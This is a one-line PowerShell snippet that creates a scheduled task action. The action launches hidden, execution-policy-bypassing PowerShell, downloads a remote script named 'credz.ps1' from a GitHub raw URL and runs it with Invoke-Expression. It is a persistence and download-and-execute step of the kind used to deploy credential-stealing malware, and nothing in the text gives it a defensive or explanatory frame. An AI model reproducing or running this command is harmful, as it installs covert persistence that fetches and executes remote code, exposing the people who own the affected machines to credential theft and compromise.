$action = New-ScheduledTaskAction -Execute 'powershell' -Argument 'WindowStyle Hidden -NoP -NonI -Exec Bypass $pl = iwr https://github.com/skekic16/lol/raw/main/credz.ps1?dl=1; invoke-expression $pl'
